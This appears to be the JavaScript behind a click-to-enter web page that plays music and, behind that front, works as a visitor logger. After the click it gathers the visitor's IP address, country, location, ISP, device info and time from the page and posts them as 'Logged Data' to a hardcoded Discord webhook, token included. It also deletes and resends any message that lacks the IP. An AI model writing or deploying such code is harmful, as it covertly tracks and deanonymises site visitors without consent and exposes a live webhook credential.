async function sendToDiscord() {
  const webhookUrl =
    "https://discord.com/api/webhooks/1346964679679017060/KzXS9kB2lH657NUdBhUpRi2aOqutfO3kf3hVjBKwefXJki4xJB6noTsUTmYWewwTUK3f";
  const hiddenContainer = document.getElementById("hiddencontainer");
  if (!hiddenContainer) {
    return;
  }

  const contentArray = [];
  const ids = [
    "welcome",
    "time-heading",
    "time",
    "device-heading",
    "device-info",
    "ipdata-heading",
    "ip-address",
    "country",
    "location",
    "isp",
    "end-heading",
  ];

  ids.forEach((id) => {
    const element = document.getElementById(id);
    if (element) {
      const text = element.innerText.trim();
      if (text && !contentArray.includes(text)) {
        contentArray.push(text);
      }
    }
  });

  const uniqueContent = contentArray.join("\n");

  const payload = {
    embeds: [
      {
        title: "Logged Data",
        description: uniqueContent,
        color: 16711680,
      },
    ],
  };

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const responseData = await response.json();
    const messageId = responseData.id;

    if (!uniqueContent.includes("ip-address")) {
      await fetch(`${webhookUrl}/messages/${messageId}`, {
        method: "DELETE",
      });
      setTimeout(sendToDiscord, 2000);
    }
  } catch (error) {
  }
}

let sendToDiscordTimeout;

function handleUserClick() {
  const flexboxContainer = document.getElementById("flexboxcontainer");
  const hiddenContainer = document.getElementById("hiddencontainer");
  if (!flexboxContainer || !hiddenContainer) {
    return;
  }

  flexboxContainer.style.display = "none";
  flexboxContainer.style.width = "0";
  flexboxContainer.style.height = "0";
  hiddenContainer.style.display = "flex";
  hiddenContainer.style.opacity = "0";

  playNextSong();

  setTimeout(() => {
    hiddenContainer.style.opacity = "1";
  }, 50);

  clearTimeout(sendToDiscordTimeout);
  sendToDiscordTimeout = setTimeout(sendToDiscord, 1000);
}

document.addEventListener("DOMContentLoaded", () => {
  const flexboxContainer = document.getElementById("flexboxcontainer");
  if (flexboxContainer) {
    flexboxContainer.addEventListener("click", handleUserClick);
  }
});